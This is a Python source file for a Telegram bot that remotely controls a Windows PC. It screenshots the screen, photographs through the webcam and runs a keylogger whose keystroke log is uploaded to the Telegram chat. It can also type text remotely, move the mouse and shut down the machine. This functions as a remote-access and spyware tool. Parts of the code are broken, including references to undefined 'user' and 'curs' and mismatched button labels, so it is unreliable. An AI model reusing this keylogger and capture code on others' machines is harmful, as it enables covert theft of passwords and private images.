################################################################################ modules
from inputData import getData, Data

################################################################################ system
import os
import sys
import time
import ctypes
import platform

################################################################################ bot
from telebot import types
import telebot

################################################################################ __screenshot
from mss import mss

################################################################################ __keylogger
import pynput
from pynput.keyboard import Key, Listener

################################################################################ __volume  __lock
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

################################################################################ __brightness
import screen_brightness_control as sbc

################################################################################ __prev  __playpause  __next  __fullscreen  __fullmovie  __close
import pyautogui

################################################################################ __browser  __search
import webbrowser
    # --new
    # 0: open in the same window
    # 1: open in a new window
    # 2: open in a new tab

################################################################################ __youtube
from youtubesearchpython import VideosSearch

################################################################################ __mouse
import mouse

################################################################################ __battery  __status
import psutil

################################################################################ __ip
import socket



################################################################################ ToDo-list
# list of favorite programs
# spotify control



################################################################################? global variables
# bot
data = getData()
bot = telebot.TeleBot(data.TOKEN)

# volume
volDevices = AudioUtilities.GetSpeakers()
volInterface = volDevices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
vol = cast(volInterface, POINTER(IAudioEndpointVolume))

# sleep
sleepFlag = False

# keylogger
keyloggerFlag = False
count = 0
keys = []

# youtube
MAX_SEARCH_LEN = 5
ytResults = []

# functions
def searchList(li, item):
    for i in range(len(li)):
        if li[i] == item:
            return True
    return False



print('🚀 Bot launched')
# bot.send_message(data.ID, '🚀 Bot launched')



################################################################################ start
# __start
@bot.message_handler(commands = ['start'])
def Start(message):
    bot.send_message(message.chat.id, '🚀  Bot launched')
    bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')


################################################################################ help
# __help
@bot.message_handler(commands = ['help'])
def Help(message):
    bot.send_message(message.chat.id, '''
*ℹ️  Information about bot:*\n\n
*🚀  /start* - Start bot\n
*ℹ️  /help* - Commands list\n
*🏞  /screenshot* - Take screenshot\n
*📸  /webcam* - Take webcam photo\n
*⌨️  /keylogger* - Start keylogger\n
*🔊  /volume* - Set volume to [value]\n
*☀️  /brightness* - Set brightness to [value]\n
*⏪  /prev* - Previous track\n
*⏯  /playpause* - Play/Pause track\n
*⏩  /next* - Next track\n
*🌐  /browser* - Open URL in browser\n
*🔍  /search* - Search in browser\n
*🎥  /youtube* - Search in youtube\n
*📺  /fullscreen* - Fullscreenf for program\n
*📺  /fullmovie* - Fullscreen for movie\n
*❌  /close* - Close current program\n
*🖱  /mouse* - Set mouse position\n
*🔒  /lock* - Lock your PC\n
*⚠️  /shutdown* - Shutdown your PC\n
*🔄  /reboot* - Restart your PC\n
*💤  /sleep* - Hibernate your PC\n
*🔋  /battery* - Show battery status\n
*🛰️  /ip* - Get your IP\n
*🆔  /getid * - Get your telegram ID\n
*⚙️  /info* - Show PC info\n
*🖥️  /status* - Show PC status\n
*⛔  /stop* - Stop bot\n
    ''', parse_mode = 'Markdown')




# buttons
mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True, one_time_keyboard = False)
btnup = types.KeyboardButton('⬆️')
btndown = types.KeyboardButton('⬇️')
btnLeft = types.KeyboardButton('⬅️')
btnRight = types.KeyboardButton('➡️')
btnClick = types.KeyboardButton('🆗')
btncurs = types.KeyboardButton('Вказати розмах курсора')
mouse_keyboard.row(btnup)
mouse_keyboard.row(btnLeft, btnClick, btnRight)
mouse_keyboard.row(btndown)
mouse_keyboard.row(btncurs)




################################################################################ screenshot
# __screenshot
@bot.message_handler(commands = ['screenshot', 'screen'])
def Screenshot(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_chat_action(data.ID ,'upload_photo')
    bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
    with mss() as screen:
        screen.shot(mon = -1, output = 'Screenshot.png')
    if not os.path.exists('./Screenshot.png'):
        return bot.send_message(message.chat.id, '*🏞  Error*, screenshot not found', parse_mode = 'Markdown')
    bot.send_document(message.chat.id, open('Screenshot.png', 'rb'))
    os.remove('Screenshot.png')


################################################################################ webcam
# __cam
@bot.message_handler(commands = ['webcam', 'cam'])
def Webcam(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_chat_action(message.chat.id, 'upload_photo')
    os.system('python webcam.py')
    if not os.path.exists('./Webcam.png'):
        return bot.send_message(message.chat.id, '*⛔  Error*, can\'t access camera', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
    bot.send_document(message.chat.id, open('Webcam.png', 'rb'))
    os.remove('Webcam.png')


################################################################################ keylogger
# __keylogger
@bot.message_handler(commands = ['keylogger', 'logger'])
def Keylogger(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    global keyloggerFlag
    keyloggerFlag = False
    markupInlineDisableKeylogger = types.InlineKeyboardMarkup()
    btnDisableKeylogger = types.InlineKeyboardButton(text = 'Disable', callback_data = 'disableKeylogger')
    markupInlineDisableKeylogger.add(btnDisableKeylogger)
    bot.send_message(message.chat.id, '⌨️  Keylogger *activated*', parse_mode = 'Markdown', reply_markup = markupInlineDisableKeylogger)
    if os.path.exists('./Logs.txt'):
        os.remove('Logs.txt')
    with Listener(on_press = onPress, on_release = onRelease) as listener:
        listener.join()
def onPress(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 1:
        writeFile(keys)
        count = 0
        keys = []
def onRelease(key):
    global keyloggerFlag
    if keyloggerFlag:
        keyloggerFlag = False
        return False
def writeFile(keys):
    with open('Logs.txt', 'a') as f:
        for key in keys:
            k = str(key).replace('\'', '')
            print(key)
            # if k.find('space') > 0:
            #     f.write('\n')
            if k.find('enter') > 0:
                f.write('[ENTER]\n')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('Key.') != -1:
                k = k.replace('Key.', '[') + ']'
                f.write(k.upper())
            elif k.find('Key') == -1:
                f.write(k)


################################################################################ write text
@bot.message_handler(commands = ['write', 'text'])
def WriteText(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, '💬  Enter text to *write*:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, WriteText_process)
def WriteText_process(message):
    text = message.text
    bot.send_chat_action(message.chat.id, 'typing')
    bot.send_message(message.chat.id, f'*✏️  Writing text*  "{text}"', parse_mode = 'Markdown')
    pyautogui.typewrite(text, interval = 0.05)


################################################################################ volume
# __volume
@bot.message_handler(commands = ['volume', 'vol'])
def Volume(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    currentVolume = getCurrentVolume()
    emoji = getVolumeEmoji(currentVolume)
    bot.send_message(message.chat.id, f'{emoji} Current volume is *{currentVolume}%*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'Enter new volume:')
    bot.register_next_step_handler(message, Volume_process)
def Volume_process(message):
    volume = message.text
    if not volume.isdigit():
        return bot.send_message(message.chat.id, 'Volume must be a number')
    volumeInt = int(volume)
    if volumeInt < 0 or volumeInt > 100:
        return bot.send_message(message.chat.id, 'Volume must be *> 0* and *< 100*', parse_mode = 'Markdown')
    emoji = getVolumeEmoji(volumeInt)
    scalarVolume = volumeInt / 100
    vol.SetMasterVolumeLevelScalar(scalarVolume, None)
    bot.send_message(message.chat.id, f'{emoji} Volume set to *{message.text}%*', parse_mode = 'Markdown')
def getCurrentVolume():
    return int(round(vol.GetMasterVolumeLevelScalar() * 100))
def getVolumeEmoji(volume):
    if volume == 0: return '🔇'
    elif volume <= 33: return '🔈'
    elif volume <= 66: return '🔉'
    else: return '🔊'


################################################################################ brightness
# __brightness
@bot.message_handler(commands = ['brightness', 'bright'])
def Brightness(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    currentBrightness = getCurrentBrightness()
    emoji = getBrightnessEmoji(currentBrightness)
    bot.send_message(message.chat.id, f'{emoji} Current brightness is *{currentBrightness}%*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'Enter new brightness:')
    bot.register_next_step_handler(message, Brightness_process)
def Brightness_process(message):
    brightness = message.text
    if not brightness.isdigit():
        return bot.send_message(message.chat.id, 'Brightness must be a number')
    brightnessInt = int(brightness)
    if brightnessInt < 0 or brightnessInt > 100:
        return bot.send_message(message.chat.id, 'Brightness must be *> 0* and *< 100*', parse_mode = 'Markdown')
    emoji = getBrightnessEmoji(brightnessInt)
    sbc.set_brightness(brightnessInt)
    bot.send_message(message.chat.id, f'{emoji} Brightness set to *{message.text}%*', parse_mode = 'Markdown')
def getCurrentBrightness():
    return sbc.get_brightness()[0]
def getBrightnessEmoji(brightness):
    if brightness < 33: return '🔅'
    elif brightness < 66: return '🔆'
    else: return '☀️'


################################################################################ previous track
# __prev
@bot.message_handler(commands = ['previous', 'prev'])
def Previous(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('prevtrack')
    bot.send_message(message.chat.id, '*⏪  Previous track*', parse_mode = 'Markdown')


################################################################################ play/pause
# __playpause
@bot.message_handler(commands = ['playpause', 'play', 'pause'])
def Playpause(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('playpause')
    bot.send_message(message.chat.id, '*⏯  Play/Pause track*', parse_mode = 'Markdown')


################################################################################ next track
# __next
@bot.message_handler(commands = ['next', 'skip'])
def Next(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('nexttrack')
    bot.send_message(message.chat.id, '*⏩  Next track*', parse_mode = 'Markdown')


################################################################################ __browser
@bot.message_handler(commands = ['browser'])
def Browser(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, 'Enter URL:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Browser_process)
def Browser_process(message):
    url = message.text
    bot.send_message(message.chat.id, f'*🌐  Opening*  {url}', parse_mode = 'Markdown')
    webbrowser.open(url, new = 2)


################################################################################ __search
@bot.message_handler(commands = ['search'])
def Search(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, 'Enter search query:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Search_process)
def Search_process(message):
    query = message.text
    bot.send_message(message.chat.id, f'*🔍  Searching*  {query}', parse_mode = 'Markdown')
    webbrowser.open(f'https://www.google.com/search?q={query}', new = 2)


################################################################################ __youtube
# @bot.message_handler(commands = ['youtube'])
# def Youtube(message):
#     if message.chat.id != user.ID:
#         return Warn(message)
#     bot.send_message(message.chat.id, 'Enter search query:', parse_mode = 'Markdown')
#     bot.register_next_step_handler(message, Youtube_process)
# def Youtube_process(message):
#     query = message.text
#     bot.send_message(message.chat.id, f'*🎥  Searching*  "{query}"', parse_mode = 'Markdown')
#     webbrowser.open(f'https://www.youtube.com/results?search_query={query}', new = 2)

@bot.message_handler(commands = ['youtube'])
def Youtube(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, 'Enter search query:', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Youtube_process)
def Youtube_process(message):
    global ytResults
    ytResults = []
    query = message.text
    search = VideosSearch(query, limit = MAX_SEARCH_LEN)
    result = search.result()
    markupInlineYtSearch = types.InlineKeyboardMarkup()
    for index in range(len(result['result'])):
        callback = f'ytSearch_{index}'
        title = result['result'][index]['title']
        duration = result['result'][index]['duration']
        link = result['result'][index]['link']
        ytResults.append({
            'callback': callback,
            'title': title,
            'duration': duration,
            'link': link
        })
        btnYtSearch = types.InlineKeyboardButton(text = f'{duration} • {title}', callback_data = callback)
        markupInlineYtSearch.add(btnYtSearch)
    if len(ytResults) > 0:
        bot.send_message(message.chat.id, f'*🎥  Results:*  "{query}"', parse_mode = 'Markdown', reply_markup = markupInlineYtSearch, disable_web_page_preview = True)
    else:
        bot.send_message(message.chat.id, f'*🎥  No results for*  "{query}"', parse_mode = 'Markdown')
def openInYoutube(link):
    webbrowser.open(link, new = 2)


################################################################################ __fullscreen
@bot.message_handler(commands = ['fullscreen'])
def Fullscreen(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('f11')
    bot.send_message(message.chat.id, '📺  *Program* is *fullscreen* now', parse_mode = 'Markdown')

@bot.message_handler(commands = ['fullscreen_movie', 'fullmovie'])
def FullscreenVideo(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    pyautogui.press('f')
    bot.send_message(message.chat.id, '📺  *Movie* is *fullscreen* now', parse_mode = 'Markdown')


################################################################################ close
@bot.message_handler(commands = ['close'])
def Close(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, '*❌  Closing*  *program*', parse_mode = 'Markdown')
    pyautogui.hotkey('altleft', 'f4')


################################################################################ lock
# __lock
@bot.message_handler(commands = ['lock'])
def Lock(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    ctypes.windll.user32.LockWorkStation()
    bot.send_message(message.chat.id, '*🔒  Locked*', parse_mode = 'Markdown')


################################################################################ shutdown
# __shutdown
@bot.message_handler(commands = ['shutdown', 'sd'])
def Shutdown(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'How many *seconds* to turn off the PC?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Shutdown_process)
def Shutdown_process(message):
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelShutdown = types.InlineKeyboardMarkup()
    btnCancelShutdown = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelShutdown')
    markupInlineCancelShutdown.add(btnCancelShutdown)
    bot.send_message(message.chat.id, f'⚠️  Shutting down in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelShutdown)
    os.system(f'shutdown -s -t {seconds}')


################################################################################ reboot
# __reboot
@bot.message_handler(commands = ['reboot', 'rb'])
def Reeboot(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(message.chat.id, 'How many *seconds* to restart the PC?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Reboot_process)
def Reboot_process(message):
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelReboot = types.InlineKeyboardMarkup()
    btnCancelReboot = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelReboot')
    markupInlineCancelReboot.add(btnCancelReboot)
    bot.send_message(message.chat.id, f'🔄  Reboot in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelReboot)
    os.system(f'shutdown -r -t {seconds}')


################################################################################ sleep
# __sleep
@bot.message_handler(commands = ['sleep'])
def Sleep(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    global sleepFlag
    sleepFlag = False
    if platform.system() != "Windows":
        return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
    bot.send_message(
        message.chat.id, 'How many *seconds* to sleep?', parse_mode = 'Markdown')
    bot.register_next_step_handler(message, Sleep_process)
def Sleep_process(message):
    global sleepFlag
    if not message.text.isdigit():
        return bot.send_message(message.chat.id, 'Time must be a number')
    seconds = int(message.text)
    markupInlineCancelSleep = types.InlineKeyboardMarkup()
    btnCancelSleep = types.InlineKeyboardButton(text = 'Cancel', callback_data = 'cancelSleep')
    markupInlineCancelSleep.add(btnCancelSleep)
    bot.send_message(message.chat.id, f'💤  Sleeping in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelSleep)
    for i in range(seconds):
        time.sleep(1)
        if sleepFlag:
            sleepFlag = False
            return
    os.system('shutdown /h')


################################################################################ battery
# __battery
@bot.message_handler(commands = ['battery'])
def Battery(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    battery = getBattery()
    status = isCharging()
    msg = f'{getBatteryEmoji(battery)}  Battery level is *{battery}*%\n'
    msg += f'{chargingEmoji(status)}  Сharging:  *{status}*'
    bot.send_message(message.chat.id, msg, parse_mode = 'Markdown')
def getBattery():
    return psutil.sensors_battery().percent
def getBatteryEmoji(battery):
    if battery <= 33:
        return '🪫'
    else:
        return '🔋'
def isCharging():
    return psutil.sensors_battery().power_plugged
def chargingEmoji(status):
    if status: return '⚡️'
    else: return '🔌'


################################################################################ ip
# __ip
@bot.message_handler(commands = ['ip'])
def SendIP(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    ip = getIP()
    bot.send_message(message.chat.id, f'🛰️ Your *IP* is *{ip}*', parse_mode = 'Markdown')
def getIP():
    return socket.gethostbyname(socket.gethostname())


################################################################################ get id
# __id
@bot.message_handler(commands = ['getid', 'id'])
def getID(message):
    bot.send_message(message.from_user.id, f'🆔  Your *ID* is *{message.from_user.id}*', parse_mode = 'Markdown')


################################################################################ info
# __info
@bot.message_handler(commands = ['info', 'pc', 'pc_info'])
def PcInfo(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    uname = platform.uname()

    msg = '⚙️  *Info about your PC*\n\n'
    # OS
    msg += f'OS:  *{uname.system} {uname.release} {uname.version}*\n'
    msg += f'Name:  *{uname.node}*\n'
    # CPU
    msg += f"Processor:  *{uname.processor}*"
    msg += f'Core:  *{psutil.cpu_count(logical = True)}*\n'
    # RAM
    msg += f'📊  RAM: *{getSize(psutil.virtual_memory().total)}*\n'
    # IP
    msg += f'🛰️  IP: *{getIP()}*'
    bot.send_message(message.chat.id, msg, parse_mode = "markdown")


################################################################################ status
# __status
@bot.message_handler(commands = ['status', 'pc_status'])
def PcStatus(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    virtualMem = psutil.virtual_memory()
    battery = getBattery()
    status = isCharging()
    brightness = getCurrentBrightness()
    volume = getCurrentVolume()

    msg = '🖥️  *Your PC Status*\n\n'
    msg += f'📊  Total CPU Usage:  *{psutil.cpu_percent()}%*\n'
    msg += f'🆓  RAM Available:  *{getSize(virtualMem.available)}*\n'
    msg += f'📟  RAM Used:  *{getSize(virtualMem.used)}*\n'
    msg += f'📊  RAM used percentage:  *{virtualMem.percent}%*\n\n'
    msg += f'{getBatteryEmoji(battery)}  Battery level:  *{battery}%*\n'
    msg += f'{chargingEmoji(status)}  Сharging:  *{status}*\n'
    msg += f'{getBrightnessEmoji(brightness)}  Brightness:  *{brightness}%*\n'
    msg += f'{getVolumeEmoji(volume)}  Volume:  *{volume}%*\n'
    bot.send_message(message.chat.id, msg, parse_mode = "markdown")
def getSize(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


################################################################################ stop
# __stop
@bot.message_handler(commands = ['stop'])
def stopBot(message):
    if not searchList(data.users, message.from_user.username):
        return Warn(message)
    bot.send_message(message.chat.id, '*⛔  Bot stopped*', parse_mode = 'Markdown')
    bot.stop_polling()
    print('⛔ Bot stopped')
    sys.exit()



################################################################################ / callback handler
# __callback
@bot.callback_query_handler(func = lambda call: True)
def TurnOffCallback(call):
    # shutdown
    if call.data == 'cancelShutdown':
        os.system('shutdown /a')
        bot.send_message(call.message.chat.id, '🛑  Shutdown *canceled*', parse_mode = 'Markdown')
    # reboot
    elif call.data == 'cancelReboot':
        os.system('shutdown /a')
        bot.send_message(call.message.chat.id, '🛑  Reboot *canceled*', parse_mode = 'Markdown')
    # sleep
    elif call.data == 'cancelSleep':
        global sleepFlag
        sleepFlag = True
        bot.send_message(call.message.chat.id, '🛑  Sleep *canceled*', parse_mode = 'Markdown')
    # keylogger
    elif call.data == 'disableKeylogger':
        global keyloggerFlag, keys
        keys = []
        bot.send_chat_action(call.message.chat.id, 'upload_document')
        keyloggerFlag = True
        bot.send_message(call.message.chat.id, '⛔  Keylogger *disactivated*', parse_mode = 'Markdown')
        if not os.path.exists('./Logs.txt'):
            bot.send_message(call.message.chat.id, '*📄  Error*, logs not found', parse_mode = 'Markdown')
        bot.send_message(call.message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
        bot.send_document(call.message.chat.id, open('Logs.txt', 'rb'))
        os.remove('Logs.txt')

    # youtube
    for index in range(MAX_SEARCH_LEN):
        global ytResults
        if len(ytResults) == 0: return
        if (call.data == f'ytSearch_{index}'):
            openInYoutube(ytResults[index]['link'])


################################################################################ warn
# __warn
def Warn(message):
    bot.send_chat_action(message.chat.id, 'typing')
    bot.send_chat_action(user.ID, 'typing')
    # other user
    bot.send_message(message.chat.id, '⚠️  *Warning*\n\n' + 'You are not allowed to use this bot', parse_mode = 'Markdown')
    # main
    msg = f'*⚠️  Someone just used  {message.text}*\n\n'
    if message.from_user.username != None:
        msg += f'Username:  *@{message.from_user.username}*\n'
    if message.from_user.first_name != None:
        msg += f'First Name:  *{message.from_user.first_name}*\n'
    if message.from_user.last_name != None:
        msg += f'Last Name:  *{message.from_user.last_name}*\n'
    msg += f'User Id:  *{message.from_user.id}*\n\n'
    bot.send_message(user.ID, f'{msg}', parse_mode = 'Markdown')

@bot.message_handler(commands = ['mouse'])
def mouseControl(message):
    bot.send_message(message.chat.id, '🖱  *Mouse* is *now* *controlled*', reply_markup = mouse_keyboard)
    bot.register_next_step_handler(message, mouse_process)
    
def mouse_process(message):
    if message.text == "⬆️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX,  currentMouseY - curs)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "⬇️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX,  currentMouseY + curs)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "⬅️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX - curs,  currentMouseY)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "➡️":
        currentMouseX,  currentMouseY  =  mouse.get_position()
        mouse.move(currentMouseX + curs,  currentMouseY)
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "🆗":
        mouse.click()
        bot.register_next_step_handler(message, mouse_process)
        # screen_process(message)

    elif message.text == "Указать размах курсора":
         bot.send_chat_action(user.ID, 'typing')
         bot.send_message(user.ID, f"Укажите размах, в данный момент размах {str(curs)}px", reply_markup = mouse_keyboard)
         bot.register_next_step_handler(message, mousecurs_settings)
def mousecurs_settings(message):
    global curs
    if message.text.isdigit():
        curs = int(message.text)
    else:
        bot.send_message(user.ID, "Incorrect value", reply_markup = mouse_keyboard)

################################################################################ infinite polling
bot.polling(none_stop = True)